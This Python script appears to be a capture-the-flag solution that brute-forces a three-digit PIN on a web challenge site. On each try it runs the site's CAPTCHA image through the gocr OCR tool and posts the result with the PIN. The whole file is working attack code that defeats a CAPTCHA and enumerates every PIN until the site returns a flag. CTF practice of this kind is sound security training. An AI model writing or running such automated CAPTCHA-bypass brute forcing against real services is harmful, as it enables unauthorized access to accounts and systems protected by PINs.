#!/usr/bin/python3

import base64, os, re, requests, pwn


def compute_digit(s, p, p2, digit):
    html = s.get(url).content
    pattern = b'<img class="img-thumbnail" src="data:image/jpg;base64,(.*?)"'
    b64_img = re.findall(pattern, html)
    file = open('test.jpg', 'wb')
    file.write(base64.b64decode(b64_img[0]))
    file.close()
    os.system('gocr -i ./test.jpg > res.txt')
    f = open('./res.txt')
    res = f.read()
    f.close()
    pin = "0"*(3-len(str(digit))) + str(digit)
    data = dict(pin=pin, answer=str(res)[:-1])
    p2.status(str(data))
    rep = s.post(url, data=data)
    p.status(rep.content.decode())
    return rep


def compute(s, p, p2):
    digit = 0
    while digit < 1000:
        rep = compute_digit(s, p, p2, digit)
        if rep.content == b'You might want to see the captcha before saying what it is !':
            pass
        elif rep.content == b'Invalid pin code':
            digit += 1
        elif rep.content == b'Bad captcha answer':
            pass
        else:
            p.success(rep.content.decode())
            return rep.content
    return


def solve(s):
    with pwn.log.progress('reponse') as p:
        with pwn.log.progress('payload') as p2:
            flag = compute(s, p, p2)


if __name__ == '__main__':
    url = 'https://shadowpex.shadow-league.org/'
    s = requests.session()
    flag = solve(s)
